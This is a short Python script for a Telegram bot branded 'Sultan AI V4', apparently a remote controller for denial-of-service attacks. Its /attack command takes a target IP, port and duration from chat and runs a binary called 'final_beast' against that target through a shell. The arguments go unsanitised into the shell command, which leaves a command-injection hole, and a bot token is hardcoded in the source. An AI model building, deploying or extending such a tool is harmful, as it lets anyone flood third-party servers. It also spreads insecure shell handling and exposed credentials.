import telebot, subprocess, time, threading, os
from flask import Flask

TOKEN = "8586393188:AAF-zC6xKyiaLil7pd_0tEbooy9jYBAFxqA"
bot = telebot.TeleBot(TOKEN)

# Render Keep-Alive System
server = Flask('')
@server.route('/')
def home():
    return "Sultan AI V4 is Online!"

def run_web():
    port = int(os.environ.get("PORT", 8080))
    server.run(host='0.0.0.0', port=port)

@bot.message_handler(commands=['start'])
def welcome(message):
    bot.reply_to(message, "🔱 **SULTAN CLOUD LIVE** 🔱\n🚀 Bot is now 24/7 on Cloud!")

@bot.message_handler(commands=['attack'])
def handle_attack(message):
    args = message.text.split()
    if len(args) < 4: return
    ip, port, dur = args[1], args[2], args[3]
    bot.reply_to(message, f"🚀 **Attack Started:** `{ip}:{port}`")
    subprocess.Popen(f"chmod +x final_beast && ./final_beast {ip} {port} {dur}", shell=True)

if __name__ == "__main__":
    threading.Thread(target=run_web).start()
    print("✅ Sultan is starting...")
    bot.polling(none_stop=True)
